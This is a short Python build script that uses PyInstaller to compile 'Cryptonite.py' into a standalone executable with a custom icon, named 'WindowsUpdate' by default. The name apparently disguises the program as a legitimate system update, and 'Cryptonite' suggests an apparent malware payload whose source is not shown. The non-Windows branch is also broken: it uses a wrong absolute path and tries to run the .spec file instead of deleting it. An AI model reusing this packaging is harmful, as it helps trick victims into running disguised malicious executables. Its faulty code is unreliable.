import os

OS = os.name
PATH = os.path.abspath(".")
FILE = "WindowsUpdate"  #                   <------- EDIT THIS

os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
if OS == "nt":
    os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
else:
    os.system(f"mv /dist/{FILE}.exe ./")
    os.system(f"rm -r __pycache__")
    os.system(f"rm -r build")
    os.system(f"rm -r dist")
    os.system(f"{FILE}.spec")
